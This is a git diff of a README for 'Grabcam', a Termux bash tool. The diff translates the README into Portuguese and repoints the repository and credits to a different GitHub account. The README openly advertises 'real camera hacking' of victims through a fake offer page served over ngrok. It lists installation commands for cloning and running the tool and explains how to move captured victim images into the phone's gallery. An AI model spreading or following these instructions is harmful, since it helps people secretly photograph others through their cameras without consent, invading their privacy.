@@ -22,34 +22,34 @@
 <a href="https://github.com/noob-hackers"><img title="Licence" src="https://img.shields.io/badge/License-MIT-blue.svg"></a>
 </p>
 
-## ABOUT TOOL :
+## SOBRE A FERRAMENTA :
 
-Grabcam is a bash based script which is officially made for termux from this tool can hack you victims camera by simple offer page. This tool works on both rooted Android device and Non-rooted Android device.
+Grabcam é um script baseado em bash que é oficialmente feito para termux, a partir desta ferramenta pode hackear a câmera de suas vítimas por uma página de oferta simples. Esta ferramenta funciona tanto em dispositivos Android com root quanto em dispositivos Android sem root.
 
-<p align="center"><a href="https://rebrand.ly/noobhacktube"><img title="Noob Hackers" src="https://user-images.githubusercontent.com/49580304/117566254-31801e00-b0d3-11eb-860d-5601b1adccb8.jpg"></a>
+<p align="center"><a href=""><img title="D1xgxS3c" src="https://user-images.githubusercontent.com/49580304/117566254-31801e00-b0d3-11eb-860d-5601b1adccb8.jpg"></a>
 </p>
 
-## AVAILABLE ON :
+## DISPONÍVEL EM:
 
 * Termux
 
-### TESTED ON :
+### TESTADO EM:
 
 * Termux
 
-### REQUIREMENTS :
+### REQUIREMENTOS :
 * internet
 * php
 * storage 400 MB
 * ngrok
 
-## FEATURES :
+## CARACTERÍSTICAS :
 * [+] Real camera hacking !
 * [+] Updated maintainence !
 * [+] Ngrok link !
 * [+] Easy for Beginners !
 
-## INSTALLATION [Termux] :
+## INSTALAÇÃO [Termux] :
 
 * `apt-get update -y`
 * `apt-get upgrade -y`
@@ -57,14 +57,14 @@ Grabcam is a bash based script which is officially made for termux from this too
 * `pkg install python2 -y`
 * `pkg install git -y`
 * `pip install lolcat`
-* `git clone https://github.com/noob-hackers/grabcam`
+* `git clone https://github.com/D1xgxS3c/grabcam`
 * `cd $HOME`
 * `ls`
 * `cd grabcam`
 * `ls`
 * `bash grabcam.sh`
 ```
-to see captured images >>>
+para ver imagens capturadas >>>
 ```
 ```
 ls
@@ -72,22 +72,22 @@ ls
 mv (image name with .png) /sdcard
 ```
 ```
-Now go and chek your gallery for victim image...
+Agora vá e confira sua galeria em busca de imagens de vítimas...
 ```
 ```
-[+]--Now you need internet connection to continue further process...
+[+]--Agora você precisa de conexão com a internet para continuar o processo...
 
-[+]--You can select any option by clicking on your keyboard
+[+]--Você pode selecionar qualquer opção clicando no seu teclado
 
-[+]--Note:- Don't delete any of the scripts included in grabcam files
+[+]--Nota:- Não exclua nenhum dos scripts incluídos nos arquivos grabcam
 
 ```
-## USAGE OPTIONS [Termux] :
+## OPÇÕES DE USO [Termux] :
 
-__SELECT OPTION__ :
-- From this option you can select type of portforwarding
+__SELECIONE A OPÇÃO__ :
+- A partir desta opção você pode selecionar o tipo de encaminhamento de porta
 
-## SCREEN SHOTS [Termux]
+## CAPTURAS DE TELA [Termux]
 
 <br>
 <p align="center">
